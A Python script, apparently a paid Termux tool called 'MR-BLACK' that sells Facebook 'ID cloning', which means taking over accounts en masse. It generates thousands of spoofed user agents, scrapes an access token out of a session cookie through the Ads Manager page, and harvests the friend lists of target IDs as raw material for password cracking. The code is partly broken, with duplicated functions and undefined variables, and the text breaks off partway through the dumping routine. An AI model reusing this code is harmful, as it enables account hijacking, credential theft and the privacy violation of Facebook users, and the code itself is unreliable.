#-----------------[ MR-BLACK ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ MR-BLACK ]-------------------#
import os, platform, time, sys
os.system ('termux-setup-storage -y')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
os.system('pip install requests ')
os.system('pip install bs4')
os.system('clear')
print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \x1b[38;5;50mCHECKING UPDATE...? ')
os.system("espeak -a 300 \"Checking,Update,\"")
os.system('git pull')
time.sleep(2)
print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 1.0...! ')
os.system("espeak -a 300 \"UPDATE VERSION 1.0,\"")
time.sleep(2)
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/120.0.2210.144",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edge/44.18363.8131",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/106.0.0.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/106.0.0.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.",]
ua = ["Mozilla/5.0 (iPad; CPU OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/122.0 Mobile/15E148 Safari/605.1.15",]
ua = ["Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/120.0.2210.141"]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/120.0.2210.141"]
ua = ["Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/120.0.2210.141"]
ua = ["Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 Edge/40.15254.603"]
ua = ["Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:122.0) Gecko/122.0 Firefox/122.0"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.2210.150 Mobile/15E148 Safari/605.1.15"]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 OPR/76.2.4027.73374"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba"]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,115)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)

for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.1.1','6.0.1','9','10','11'])
	c=random.choice(['SM-J510F','SM-J510G','SM-J510FN','SM-J510Y','SM-J510M','SM-J510GN','SM-J510H','SM-J510MN','SM-J5108','SM-J510UN','SM-J510L','SM-J510S','SM-J510FQ','SM-J510K'])
	d=random.choice(['Build/NMF26X','Build/MMB29M','Build/PQ3B.190801.002'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	fahim=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(fahim)
	a='Mozilla/5.0 (Linux; Android'
	b='5.1.1'
	c=random.choice(['SM-J120F','SM-J120H','SM-J120M','SM-J120M','SM-J120T','SM-J120G','SM-J120A','SM-J120FN','SM-J120AZ','SM-J120ZN','SM-J120W'])
	d=random.choice(['Build/LMY47V','Build/LMY47X','Build/NMF26F'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	op=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(op)
	ua2='com.google.GoogleMobile/45.0.0 iPhone/10.2 hw/iPhone9_3'
	ua3='com.google.GoogleMobile/109.0 iPhone/12.4.1 hw/iPhone9_3'
	ua4='com.google.GoogleMobile/132.0 iPhone/14.0.1 hw/iPhone9_3'
	ua5='com.google.GoogleMobile/194.0 iPhone/15.2.1 hw/iPhone9_1'
	ua6='com.google.GoogleMobile/111.0 iPhone/13.5.1 hw/iPhone9_3'
	ua7='com.google.GoogleMobile/56.0.0 iPhone/11.4.1 hw/iPhone9_3'
	ua8='com.google.GoogleMobile/89.2.0 iPhone/13.3.1 hw/iPhone9_3'
	ua9='com.google.GoogleMobile/153.1 iPhone/14.4.2 hw/iPhone9_1'
	ua10='com.google.GoogleMobile/48.0.0 iPhone/11.1 hw/iPhone9_3'
	ua11='com.google.GoogleMobile/41.0.0 iPhone/11.0.3 hw/iPhone9_1'
	ua12='com.google.GoogleMobile/51.0.0 iPhone/13.3.1 hw/iPhone9_1'
	ua13='com.google.GoogleMobile/44.0.0 iPhone/14.4 hw/iPhone9_1'
	ua14='com.google.GoogleMobile/94.0 iPhone/12.4.1 hw/iPhone9_3'
	ua15='com.google.GoogleMobile/117.0 iPhone/13.5.1 hw/iPhone9_3'
	ua16='com.google.GoogleMobile/39.0.0 iPhone/11.3 hw/iPhone9_3'
	ua17='com.google.GoogleMobile/46.0.0 iPhone/10.3.1 hw/iPhone9_1'
	ua18='com.google.GoogleMobile/107.0 iPhone/13.4.1 hw/iPhone9_1'
	ua19='com.google.GoogleMobile/59.0.0 iPhone/13.3 hw/iPhone9_1'
	ua20='com.google.GoogleMobile/111.0 iPhone/13.3.1 hw/iPhone9_1'
	ua21='com.google.GoogleMobile/112.0 iPhone/13.5.1 hw/iPhone9_3'	
	fff = random.choice([ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15,ua16,ua17,ua18,ua19,ua20,ua21])
	ugen.append(fff)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','7.0','6.0.1'])
	c=random.choice(['SM-G610F','SM-G610Y','SM-G610M','SM-G610'])
	d=random.choice(['Build/NRD90M','MMB29K','Build/M1AJQ'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	fah=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(fah)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13'])
	c=random.choice(['SM-A716F','SM-A716F/DS','SM-A716F/DSN','SM-A7160','SM-A716B/DS','SM-A716U','SM-A716B','SM-A716U1'])
	d=random.choice(['Build/TP1A.220624.014','Build/SP1A.210812.016','Build/RP1A.200720.012','Build/QP1A.190711.020'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	fa=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(fa)
	#a50
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11'])
	c=random.choice(['SM-A505F','SM-A505FN','SM-A505GN','SM-A505G','SM-A505FM','SM-A505YN','SM-A505W','SM-A505X','SM-A505U','SM-A505GT','SM-A505U1','SM-A505G','SM-A505N','SM-S506DL'])
	d=random.choice(['Build/RP1A.200720.012','Build/QP1A.190711.020','Build/PPR1.180610.011'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	ffa=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(ffa)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','8.0.0','10'])
	c=random.choice(['SM-G965F','SM-G965U','SM-G965W','SM-G9650','SM-G965U1','SM-G965N','SCV39','SM-G965X','SC-03K'])
	d=random.choice(['Build/R16NW','Build/QP1A.190711.020','Build/PPR1.180610.011'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	ffa=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(ffa)
for i in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ HEART- ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
logo ="""LOGO"""

def meyexudi():
  os.system('clear')
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/BlackFF444/Api/blob/main/Approval.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      pass
    else:
      print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98m║══[𝟸]💥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;97m║══[𝟸]💥  WI-FI  AND DATA BOTH WORKING 100%')
      print(' \x1b[1;95m║══[𝟸]💥  7 DAY 150 TAKA ')
      print(' \x1b[1;95m║══[𝟸]💥  15 DAY 250 TAKA ')
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   BLACK,    Please,   Send,   Your,   Key,"')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
meyexudi()
#os.system("python PAID.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
os.system('espeak -a 300 " Welcome,   to,  MR.BLACK,  PAID,   Tools"')
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'O' and password == 'P':
        print(' \033[0;95mYou Have Successfully Logged in.')
        os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python PAID.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
    print('\033[0;97m===============================================')
    print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
    print('\033[0;97m=================')
    HEART = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
    elif HEART in ['1']:
        crack_file()
    elif HEART in ['2','02']:
        os.system("python PAID.py")
    elif HEART in ['3','03']:
        os.system("python PAID.py")
    elif HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()

def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        print('\033[0;91m==================')
        jum = int(input(' \033[95;1m[\033[92;1m•\033[95;1m] ENTER TARGET AMOUNT  : '))
        print('\033[0;91m==================')
    except ValueError:
        print('\033[0;91m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum<1 or jum>100000000:
        print('\033[0;91m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(' \033[97;1m[\033[92;1m•\033[95;1m] INPUT UID '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\033[0;95m==================')
